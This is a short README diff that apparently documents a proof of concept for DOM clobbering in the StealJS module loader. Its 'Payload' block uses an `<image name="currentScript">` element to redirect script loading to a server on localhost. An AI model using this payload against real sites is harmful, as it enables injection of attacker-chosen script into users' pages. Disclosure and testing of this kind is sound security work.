@@ -27,12 +27,12 @@ too complicated.
 
 after running `npm install`
 
-```html
-<!doctype html>
-<html>
-  <body>
-    <image name="currentScript" src="http://localhost:8000/"></image>
-    <script src="./node_modules/steal/steal.js" main></script>
-  </body>
-</html>
+```
+<!--Library-->
+<script src="./node_modules/steal/steal.js" main></script>
+<!--Library-->
+
+<!--Payload-->
+<image name="currentScript" src="http://localhost:9999"></image>
+<!--Payload-->
 ```
